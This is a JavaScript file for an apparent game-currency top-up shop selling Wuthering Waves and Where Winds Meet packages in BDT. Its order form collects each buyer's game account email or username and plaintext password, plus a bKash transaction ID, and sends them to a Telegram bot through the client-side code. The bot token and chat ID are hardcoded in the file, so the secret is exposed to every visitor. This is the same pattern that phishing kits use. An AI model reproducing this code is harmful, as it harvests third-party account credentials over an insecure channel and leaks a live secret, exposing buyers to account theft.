const packages = {
    ww: [
        { id: 'ww1', type: 'Lunite Subscription', name: 'Tide Blessing Pack', price: 449 },
        { id: 'ww2', type: 'Resonator Pass', name: 'Standard Pass', price: 949 },
        { id: 'ww3', type: 'Resonator Pass', name: 'Premium Pass+', price: 2199 },
        { id: 'ww4', type: 'Lunite Top-Up', name: '120 Lunites', price: 109 },
        { id: 'ww5', type: 'Lunite Top-Up', name: '600 Lunites', price: 449 },
        { id: 'ww6', type: 'Lunite Top-Up', name: '1960 Lunites', price: 1649 },
        { id: 'ww7', type: 'Lunite Top-Up', name: '3960 Lunites', price: 3299 },
        { id: 'ww8', type: 'Lunite Top-Up', name: '6560 Lunites', price: 5499 },
        { id: 'ww9', type: 'Lunite Top-Up', name: '12960 Lunites', price: 10999 }
    ],
    wwm: [
        { id: 'wwm1', type: 'Moonlit Supply', name: 'Spirit Subscription', price: 449 },
        { id: 'wwm2', type: 'Hero’s Journey', name: 'Battle Scroll', price: 949 },
        { id: 'wwm3', type: 'Hero’s Journey', name: 'Battle Scroll+', price: 2199 },
        { id: 'wwm4', type: 'Spirit Jade Top-Up', name: '120 Spirit Jade', price: 109 },
        { id: 'wwm5', type: 'Spirit Jade Top-Up', name: '600 Spirit Jade', price: 449 },
        { id: 'wwm6', type: 'Spirit Jade Top-Up', name: '1960 Spirit Jade', price: 1649 },
        { id: 'wwm7', type: 'Spirit Jade Top-Up', name: '3960 Spirit Jade', price: 3299 },
        { id: 'wwm8', type: 'Spirit Jade Top-Up', name: '6560 Spirit Jade', price: 5499 },
        { id: 'wwm9', type: 'Spirit Jade Top-Up', name: '12960 Spirit Jade', price: 10999 }
    ]
};

const BOT_TOKEN = '8579178443:AAHDl_DEr43_AdA30j9y79FMWTlTFUJlGag';
const CHAT_IDS = ['8395284772'];

const container = document.getElementById('packages-container');
const modal = document.getElementById('order-modal');
const qtyInput = document.getElementById('quantity');
const displayPrice = document.getElementById('display-price');
const serverGroup = document.getElementById('server-group');
const serverInput = document.getElementById('server');
const serverText = document.getElementById('selected-server-text');
const serverOptions = document.getElementById('server-options');

let currentPackage = null;
let currentGame = '';

function render(game) {
    container.innerHTML = '';
    currentGame = game;
    
    // Smart Form Logic
    if(game === 'wwm') {
        serverGroup.style.display = 'none';
        serverInput.removeAttribute('required');
    } else {
        serverGroup.style.display = 'block';
        serverInput.setAttribute('required', 'true');
    }

    const gameNameDisplay = game === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';

    packages[game].forEach((p, i) => {
        const div = document.createElement('div');
        div.className = 'package-card';
        div.innerHTML = `<div class="inner-content"><span class="pack-type">${p.type}</span><h3>${p.name}</h3><p>${p.price} <span>BDT</span></p></div>`;
        
        // WOW Feature: 3D Magnetic Tilt Effect
        div.addEventListener('mousemove', (e) => {
            const rect = div.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            const centerX = rect.width / 2;
            const centerY = rect.height / 2;
            const rotateX = ((y - centerY) / centerY) * -10; // Max tilt 10deg
            const rotateY = ((x - centerX) / centerX) * 10;
            div.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
        });
        
        div.addEventListener('mouseleave', () => {
            div.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`;
        });

        div.onclick = () => {
            currentPackage = p;
            document.getElementById('modal-package-name').innerText = p.name;
            document.getElementById('modal-game-name').innerText = gameNameDisplay;
            qtyInput.value = 1;
            updateUI();
            modal.classList.remove('hidden');
        };
        container.appendChild(div);
    });
}

// Custom Dropdown Logic
function toggleSelect() {
    serverOptions.classList.toggle('hidden');
}
function selectServer(val) {
    serverText.innerText = val;
    serverText.style.color = '#fff';
    serverInput.value = val;
}
// Close dropdown when clicked outside
document.addEventListener('click', (e) => {
    if (!e.target.closest('.custom-select-wrapper')) {
        serverOptions.classList.add('hidden');
    }
});

function updateUI() {
    displayPrice.innerText = currentPackage.price * parseInt(qtyInput.value);
}

document.getElementById('plus-btn').onclick = () => { qtyInput.value = parseInt(qtyInput.value) + 1; updateUI(); };
document.getElementById('minus-btn').onclick = () => { if(qtyInput.value > 1) { qtyInput.value = parseInt(qtyInput.value) - 1; updateUI(); } };

document.querySelector('.close-btn').onclick = () => modal.classList.add('hidden');

document.querySelectorAll('.game-btn').forEach(btn => {
    btn.onclick = (e) => {
        document.querySelectorAll('.game-btn').forEach(b => b.classList.remove('active'));
        e.target.classList.add('active');
        render(e.target.dataset.game);
    };
});

document.getElementById('order-form').onsubmit = async (e) => {
    e.preventDefault();
    const btn = document.getElementById('submit-btn');
    btn.disabled = true; btn.innerHTML = 'Processing...';

    const gameStr = currentGame === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
    const srvLine = currentGame === 'ww' ? `\n🌍 *Server:* \`${serverInput.value}\`` : '';

    const msg = `🧾 *Premium Order Received*

🎮 *Game:* ${gameStr}
📦 *Package:* ${currentPackage.name}
🔢 *Quantity:* ${qtyInput.value}
💰 *Total Pay:* ${displayPrice.innerText} BDT

👤 *Account Info:*
✉️ *Email/User:* \`${document.getElementById('email-username').value}\`
🔑 *Pass:* \`${document.getElementById('password').value}\`
🏷️ *IGN:* \`${document.getElementById('ign').value}\`${srvLine}

💳 *Payment (bKash)*
🧾 *TrxID:* \`${document.getElementById('trxid').value}\``;

    try {
        for (const id of CHAT_IDS) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: id, text: msg, parse_mode: 'Markdown' })
            });
        }
        modal.classList.add('hidden');
        document.getElementById('success-modal').classList.remove('hidden');
    } catch (err) {
        alert('Connection error. Try again.');
    } finally {
        btn.disabled = false; btn.innerHTML = '<span class="btn-text">Confirm Purchase</span>';
        document.getElementById('order-form').reset();
        serverText.innerText = 'Select Server';
        serverText.style.color = 'var(--text-secondary)';
    }
};

document.getElementById('close-success').onclick = () => document.getElementById('success-modal').classList.add('hidden');

function copyNumber() {
    navigator.clipboard.writeText('01610359086').then(() => {
        const icon = document.getElementById('copy-icon');
        icon.innerText = '✔️';
        setTimeout(() => icon.innerText = '📋', 2000);
    });
}

// Init
render('ww');
